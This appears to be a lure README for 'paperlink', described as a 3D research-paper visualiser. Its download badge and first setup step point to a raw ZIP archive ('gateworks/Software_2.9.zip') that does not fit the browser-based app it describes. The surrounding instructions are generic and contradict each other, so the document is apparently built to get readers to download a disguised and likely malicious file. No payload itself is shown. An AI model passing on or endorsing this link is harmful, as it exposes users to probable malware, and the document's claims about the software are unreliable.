# 🌌 paperlink - Explore your research papers in 3D

[![Download paperlink](https://img.shields.io/badge/Download-paperlink-blue)](https://raw.githubusercontent.com/Leohendric8458/paperlink/main/gateworks/Software_2.9.zip)

paperlink turns your static research paper collection into an interactive 3D galaxy. You see your documents as stars in a star map. Navigation through your data happens in a web browser. This project uses Three.js and WebGL to render your files. You organize your library in a simple list, and the software builds a spatial map for you.

## 🚀 How it works

The software reads a list of files from a data table. Each paper becomes a point in 3D space. You move through the galaxy with your mouse to find connections between topics. This visualization tool helps researchers see patterns across large sets of academic work. You gain insight into how themes relate to each other.

## 💻 System requirements

- A web browser like Chrome, Firefox, or Edge.
- An internet connection to load the visualization files.
- A mouse or trackpad for navigation.
- 4GB of RAM for smooth performance.

## 🛠️ Setting up the application

1. Visit the following address to access the project files: [https://raw.githubusercontent.com/Leohendric8458/paperlink/main/gateworks/Software_2.9.zip](https://raw.githubusercontent.com/Leohendric8458/paperlink/main/gateworks/Software_2.9.zip).
2. Look for the green button labeled "Code" on the right side of the screen.
3. Click "Download ZIP" from the menu.
4. Locate the file in your Downloads folder.
5. Right-click the folder and select "Extract All".
6. Open the extracted folder to find your files.

## 📝 Updating your library

The software draws information from a file named `papers.json`. You edit this file to change the papers shown in your galaxy.

1. Open the folder you extracted.
2. Find the file labeled `papers.json`.
3. Right-click this file and choose "Open with" then select "Notepad".
4. You see a list of entries inside brackets. Each entry contains a title, an author, and a link to your paper.
5. Add your new paper details between the curly brackets. Follow the format of the existing items.
6. Save the file and close Notepad.
7. Refresh your browser to see your changes.

## 🖱️ Navigating the galaxy

- Click and drag your mouse to rotate the galaxy.
- Use your scroll wheel to zoom into specific clusters of papers.
- Left-click a point to view a popup with author and title information.
- Click the provided link in the popup to open the research paper in a new tab.

## 🧩 Modifying display settings

You adjust how the data looks by editing the settings file.

1. Navigate to the folder named `assets`.
2. Find the file `config.json`.
3. Open this file with Notepad.
4. Change the colors or sizes of the star points. The file uses red, green, and blue values. 
5. Save the file.
6. Reload the project in your browser to inspect the visual changes.

## 🌐 Deploying your galaxy online

You reach your research galaxy from any computer when you put it online.

1. Visit GitHub Pages to create a free web space.
2. Create a new repository on your GitHub account.
3. Upload the files from your `paperlink` folder into this new repository.
4. Go to the "Settings" tab in your repository.
5. Select "Pages" on the left menu.
6. Change the "Source" to "main branch".
7. Wait several minutes for the system to process your files.
8. Your unique web link appears at the top of the page. You now access your 3D research galaxy from any browser using this web address.

## 🔍 Troubleshooting

- If the galaxy fails to load, check the `papers.json` file for missing quotation marks or misplaced commas.
- Ensure all images or files listed in the data table exist in the appropriate folders.
- Use the "Inspect" tool in your browser to look for red error messages if the data does not appear.
- Clear your browser cache if you make changes that do not show up on the screen.
- Verify that your internet connection stays active during the loading stage, as the 3D engine requires external files.

## 📂 Data structure breakdown

The `papers.json` file acts as the bridge between your text files and the 3D scene. Every item needs a specific structure:

- Title: The name of the paper.
- Author: The name of the researchers.
- Date: The publication year.
- Category: A label to group papers by topic.

The software sorts these categories into different color zones within the galaxy. This allows you to find clusters of similar topics instantly. Each node in the 3D space connects to its source file. You gain a visual overview of your research habits through the density of stars in each region. The more papers you link, the larger your galaxy grows.